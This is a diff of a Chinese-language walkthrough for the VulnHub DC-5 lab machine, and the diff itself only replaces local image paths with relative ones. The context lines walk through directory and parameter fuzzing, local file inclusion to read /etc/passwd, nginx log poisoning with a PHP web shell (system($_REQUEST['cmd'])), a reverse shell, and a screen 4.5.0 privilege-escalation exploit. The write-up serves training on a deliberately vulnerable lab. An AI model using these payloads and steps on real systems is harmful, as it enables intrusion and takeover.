@@ -12,19 +12,19 @@
 
 使用`arp-scan -l`或者`netdiscover -r 192.168.10.1/24`
 
-![](D:\stu\vulnhub\DC靶场\pic-5\1.jpg)
+![](./pic-5/1.jpg)
 
 # 信息收集 
 
 ## 使用nmap扫描端口
 
-![](D:\stu\vulnhub\DC靶场\pic-5\2.jpg)
+![](./pic-5/2.jpg)
 
 ## 网站信息探测
 
 访问80端口默认界面，查看页面源代码，发现脚本语言为`php`
 
-![](D:\stu\vulnhub\DC靶场\pic-5\3.jpg)
+![](./pic-5/3.jpg)
 
 使用`gobuster、dirsearch、ffuf、dirb、dirbuster`等工具对目标进行目录爆破
 
@@ -32,7 +32,7 @@
 gobuster dir -u http://192.168.10.4 -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,md -d -b 404
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-5\4.jpg)
+![](./pic-5/4.jpg)
 
 # 漏洞寻找
 
@@ -45,7 +45,7 @@ ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://192.168.10.4/thankyou.php
 #-fs是过滤该字节大小的数据，也就是原始的thankyou.php的数据大小
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-5\5.jpg)
+![](./pic-5/5.jpg)
 
 发现参数`file`，那么再测试有什么可注入点，通过这个参数
 
@@ -54,11 +54,11 @@ ffuf -c -w /usr/share/wordlists/wfuzz/Injections/All_attack.txt -u http://192.16
 #-fs后面的数据变化了，是因为数据大小发生变化，在有file参数后，原始的大小变为835
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-5\6.jpg)
+![](./pic-5/6.jpg)
 
 通过构造链接，获取`/etc/passwd`文件，发现靶机内有一个用户`dc`
 
-![](D:\stu\vulnhub\DC靶场\pic-5\7.jpg)
+![](./pic-5/7.jpg)
 
 但是这里没有办法获取`/etc/shadow`文件，所以继续寻找其他点，尝试使用从`github`上获取的字典，继续进行测试
 
@@ -66,7 +66,7 @@ ffuf -c -w /usr/share/wordlists/wfuzz/Injections/All_attack.txt -u http://192.16
 ffuf -c -w /usr/share/wordlists/linux_file.txt -u http://192.168.10.4/thankyou.php?file=FUZZ -fs 835
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-5\8.jpg)
+![](./pic-5/8.jpg)
 
 # 漏洞利用
 
@@ -98,17 +98,17 @@ http://192.168.10.4/thankyou.php?file=<?php system('id');>
 view-source:http://192.168.10.4/thankyou.php?file=/var/log/nginx/error.log
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-5\9.jpg)
+![](./pic-5/9.jpg)
 
 那么尝试使用`burp`进行抓取数据包，测试其在哪个阶段进行的`url`编码，发现是在到服务器之前进行的编码，那么可以在`burp`中修改，并且，还是有可能注入的
 
-![](D:\stu\vulnhub\DC靶场\pic-5\10.jpg)
+![](./pic-5/10.jpg)
 
 啧，这里靶机出了问题，再访问`error.log`没有任何信息，所以无奈之下，重装靶机，可能之前进行爆破的时候，太多导致的
 
 这时候把编码的代码进行复原，然后进行转发
 
-![](D:\stu\vulnhub\DC靶场\pic-5\11.jpg)
+![](./pic-5/11.jpg)
 
 再次访问`access.log`，这里为什么是`access.log`不是`error.log`了呢，因为重装后，好了，`access.log`有数据了，不过访问`error.log`也是可以看到数据的
 
@@ -118,7 +118,7 @@ view-source:http://192.168.10.4/thankyou.php?file=/var/log/nginx/error.log
 view-source:http://192.168.10.4/thankyou.php?file=/var/log/nginx/access.log
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-5\12.jpg)
+![](./pic-5/12.jpg)
 
 访问`error.log`的效果如下
 
@@ -126,7 +126,7 @@ view-source:http://192.168.10.4/thankyou.php?file=/var/log/nginx/access.log
 view-source:http://192.168.10.4/thankyou.php?file=/var/log/nginx/error.log
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-5\13.jpg)
+![](./pic-5/13.jpg)
 
 而且说白了，在进行构造时，参数是不是`file`都行，只要在进行查看，也就是文件包含时，使用即可
 
@@ -134,7 +134,7 @@ view-source:http://192.168.10.4/thankyou.php?file=/var/log/nginx/error.log
 
 构造代码`<?php system($_REQUEST['cmd']);?>`，然后再次通过`burp`改包后转发
 
-![](D:\stu\vulnhub\DC靶场\pic-5\14.jpg)
+![](./pic-5/14.jpg)
 
 然后在浏览器上访问，这时候就需要构造链接了
 
@@ -157,13 +157,13 @@ view-source:http://192.168.10.4/thankyou.php?file=/var/log/nginx/access.log&cmd=
 
 把URL编码后的语句传参给`cmd`，就可以获取到一个反弹`shell`
 
-![](D:\stu\vulnhub\DC靶场\pic-5\15.jpg)
+![](./pic-5/15.jpg)
 
 在查看当前靶机内用户，发现只要`dc`，并且其中的目录下，并没有任何文件，个人感觉，可能都不需要提权至`dc`了
 
 使用`find`寻找具有SUID权限的文件，啧，发现`exim4`文件，是不是很眼熟，因为这个和上个靶机很像，就是不知道版本是否一致
 
-![](D:\stu\vulnhub\DC靶场\pic-5\16.jpg)
+![](./pic-5/16.jpg)
 
 # 提权
 
@@ -173,7 +173,7 @@ view-source:http://192.168.10.4/thankyou.php?file=/var/log/nginx/access.log&cmd=
 searchsploit exim 4.8 privilege
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-5\17.jpg)
+![](./pic-5/17.jpg)
 
 不过发现一个不常见的命令`screen-4.5.0`
 
@@ -183,15 +183,15 @@ searchsploit exim 4.8 privilege
 searchsploit screen 4.5.0
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-5\18.jpg)
+![](./pic-5/18.jpg)
 
 使用`locate`定位到文件的位置，然后为了方便复制到当前目录下的位置，然后查看脚本文件内容，发现涉及到`gcc`编译
 
-![](D:\stu\vulnhub\DC靶场\pic-5\19.jpg)
+![](./pic-5/19.jpg)
 
 那么测试靶机内有无环境，就是有无安装`gcc`，并且能否使用`wget`
 
-![](D:\stu\vulnhub\DC靶场\pic-5\20.jpg)
+![](./pic-5/20.jpg)
 
 不过在执行脚本后，直接出错，不过观察脚本，按理说，应该是可以进行创建等操作的，既然在靶机内无法直接执行脚本，那么就把脚本中的内容进行分段处理，这里就是三部分，两个`c`文件，然后还有编译的操作命令。
 
@@ -258,7 +258,7 @@ screen -ls # screen itself is setuid, so...
 gcc: error trying to exec 'cc1': execvp: No such file or directory
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-5\21.jpg)
+![](./pic-5/21.jpg)
 
 可以使用临时环境变量配置，一般的`gcc`关键目录可能都在这个
 
@@ -268,15 +268,15 @@ export PATH=$PATH:/usr/local/bin/
 
 这时候再按照两个`c`文件对应的`gcc`编译命令，然后就可以编译成功
 
-![](D:\stu\vulnhub\DC靶场\pic-5\22.jpg)
+![](./pic-5/22.jpg)
 
 执行脚本文件，即可发现提权成功
 
-![](D:\stu\vulnhub\DC靶场\pic-5\23.jpg)
+![](./pic-5/23.jpg)
 
 查看`flag`
 
-![](D:\stu\vulnhub\DC靶场\pic-5\24.jpg)
+![](./pic-5/24.jpg)
 
 # 清除痕迹
 
